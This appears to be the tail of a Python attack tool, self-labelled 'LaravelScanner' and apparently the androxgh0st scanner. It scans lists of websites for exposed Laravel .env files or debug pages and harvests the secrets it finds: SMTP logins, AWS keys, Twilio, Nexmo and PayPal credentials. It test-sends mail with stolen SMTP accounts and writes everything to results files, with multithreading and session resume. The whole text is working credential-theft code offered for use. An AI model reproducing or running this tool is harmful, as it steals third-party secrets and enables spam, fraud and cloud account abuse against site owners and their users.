                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/office.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif '1and1' in mailhost or '1und1' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/1and1.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/zoho.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/mandrill.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/mailgun.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False

def printf(text):
    ''.join([str(item) for item in text])
    print((text + '\n'), end=' ')

def main(url):
    resp = False
    try:
        text = '\033[32;1m#\033[0m '+url
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = androxgh0st().get_smtp(resp, url)
            getwtilio = androxgh0st().get_twillio(resp, url)
            smsapi = androxgh0st().get_nexmo(resp, url)
            getaws = androxgh0st().get_aws_data(resp, url)
            getpp = androxgh0st().paypal(resp, url)
            if getsmtp:
                text += ' | \033[32;1mSMTP\033[0m'
            else:
                text += ' | \033[31;1mSMTP\033[0m'
            if getaws:
                text += ' | \033[32;1mAWS\033[0m'
            else:
                text += ' | \033[31;1mAWS\033[0m'
            if getwtilio:
                text += ' | \033[32;1mTWILIO\033[0m'
            else:
                text += ' | \033[31;1mTWILIO\033[0m'
            if smsapi:
                text += ' | \033[32;1mSMS API\033[0m'
            else:
                text += ' | \033[31;1mSMS API\033[0m'
            if getpp:
                text += ' | \033[32;1mPAYPAL\033[0m'
            else:
                text += ' | \033[31;1mPAYPAL\033[0m'
        else:
            text += ' | \033[31;1mCan\'t get everything\033[0m'
            save = open('Results/not_vulnerable.txt','a')
            asu = str(url).replace('\r', '')
            save.write(asu+'\n')
            save.close()
    except:
        text = '\033[31;1m#\033[0m '+url
        text += ' | \033[31;1mCan\'t access sites\033[0m'
        save = open('Results/not_vulnerable.txt','a')
        asu = str(url).replace('\r', '')
        save.write(asu+'\n')
        save.close()
    printf(text)


if __name__ == '__main__':
    print("""
        
                             LaravelScanner v1.0         Coded By :                                                                
                       
                         For tools contact me : https://t.me/itslucifero
                         Date : 19 March 2022 10pm
                         Group https://t.me/itslucifero  """)
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print(('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi))
        tanya = input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            print('ereur') # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = input("Give me THE PATH To list :   ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found Try Again")
                exit()
            try:
                numthread = input("threads Or Sites per sec tbh xd :  ")
            except:
                print("Wrong thread number , Enter a valid number")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass
